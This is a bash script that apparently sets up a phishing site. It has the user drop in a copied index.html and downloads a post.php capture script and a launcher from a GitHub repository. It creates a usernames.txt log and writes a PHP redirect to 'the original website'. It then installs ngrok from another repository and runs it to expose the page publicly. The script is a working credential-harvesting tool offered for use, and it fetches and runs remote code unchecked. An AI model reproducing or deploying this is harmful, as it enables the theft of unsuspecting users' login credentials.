echo "Choose your device: "
echo "1. Phone"
echo "2. Computer"
read -r device
case $device in
1) loc=/sdcard
;;
2) loc=/mnt/d
esac
echo
echo
echo "Website Name: "
read -r website
if [ ! -e "$HOME/web" ]; then
cd ~ && mkdir web
else
echo "Fine! web folder existed in Home directory.."
fi
echo
if [ ! -e "$loc/web" ]; then
cd $loc/ && mkdir web
else
echo "Fine! web folder existed in your Storage"
fi
if [ -e "$loc/web/$website" ]; then 
echo "Fine! $website folder existed"
else
cd $loc/web && mkdir "$website"
fi
echo "      Put your index.html inside web/$website folder" 
echo " Press Enter when you already put index.html"
read any
cd $loc/web/$website
git clone https://github.com/NganDii/webmakerfiles
cd webmakerfiles
cp Go.sh post.php $loc/web/$website
cd ..
rm -rf webmakerfiles
cat <<EOF>run.sh
cd $HOME/web/$website && bash Go.sh
EOF
cat <<EOF>usernames.txt
EOF
echo "Enter the original website link"
read -r ori
cat <<EOF>location.php
<?php
header ('Location: $ori');
?>
EOF
rm -rf ~/web/$website
cp -R $loc/web/$website ~/web
rm -rf $loc/web/$website
cd ~
if [ ! -e "$HOME/ngrok" ]; then
git clone https://github.com/NganDii/ngrokold
cd ngrokold && bash Install.sh
fi
cp -R ~/ngrok web/$website
cd ~/web/$website
chmod +x * 
bash run.sh
echo ""
